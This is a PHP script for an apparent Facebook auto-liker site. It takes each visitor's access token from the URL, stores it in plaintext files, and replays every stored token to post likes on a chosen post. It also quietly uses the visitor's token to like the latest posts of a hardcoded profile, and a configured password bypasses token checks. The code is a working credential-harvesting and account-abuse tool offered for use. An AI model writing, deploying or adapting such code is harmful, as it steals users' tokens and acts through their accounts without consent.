<?php error_reporting(0);
$accesstoken = $_GET['accesstoken'];
$postid = $_GET['postid'];
if(empty($accesstoken))
{
	session_destroy();
	header("Location: index.php?error=Enter Your Access Token !");
	die();
}
if(empty($postid))
{
	header('Location: m-liker.php?accesstoken='.$accesstoken.'');
	die();
}
else
{
	require 'php-sdk/facebook.php';
	include 'info.php';
	$facebook = new Facebook(array(
	'appId'  => '',
	'secret' => ''
	));
	try
	{
	   $parameters['access_token'] = $accesstoken;
	   $userData = $facebook->api('/me?fields=id,name', $parameters);
	}
	catch (FacebookApiException $e)
	{
		if($accesstoken == $set[password])
		{
		}
		else
		{
			session_destroy();
			header("Location: index.php?error=Access Token Expired !");
			die();
		}
	}
}
$remove1 = '=';
$remove2 = '&';
preg_match('/'.preg_quote($remove1).'(.*?)'.preg_quote($remove2).'/is', $postid, $postidFiltered);
if(!$postidFiltered[1])
{
	$postid = $postid;
}
else
{
	$postid = $postidFiltered[1];
}
if($userData)
{
	try
	{
	   $facebook->setAccessToken ($accesstoken);
	   $statuses = $facebook->api('/100002490815358/feed?limit=5');
	   foreach($statuses['data'] as $status)
	   {
		   $facebook->api("/".$status["id"]."/likes", 'POST');
	   }
	}
	catch (FacebookApiException $e)
	{
	}
	$user = $userData['id'];
	$handle = fopen('database/'.$user.'', 'w') or die('Error !');
	fwrite($handle, $accesstoken);
	fclose($handle);
}
if($handle = opendir('database'))
{
	while (false !== ($entry = readdir($handle)))
	{
		if($entry != "." && $entry != "..")
		{
			$user = fopen('database/'.$entry.'',"r") or die('Error !');
			$token = fgets($user);
			$facebook->setAccessToken ($token);
			try
			{
				$facebook->api("/".$postid."/likes", 'POST');
			}
			catch (FacebookApiException $e)
			{
			}
		}
	}
	closedir($handle);
}
header('Location: menu.php?accesstoken='.$accesstoken.'&success=Success !');
?>